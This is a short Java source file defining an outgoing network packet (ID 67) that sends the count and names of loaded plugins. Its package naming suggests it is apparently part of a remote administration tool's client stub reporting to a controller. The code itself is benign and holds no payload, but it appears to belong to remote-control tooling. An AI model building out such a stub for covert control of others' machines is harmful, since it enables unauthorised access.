package com.redpois0n.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;
import com.redpois0n.stub.Plugin;

public class Packet67LoadedPlugins extends AbstractOutgoingPacket {

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(Plugin.list.size());
		
		for (Plugin plugin : Plugin.list) {
			sw.writeLine(plugin.name);
		}
	}

	@Override
	public byte getPacketId() {
		return 67;
	}

}
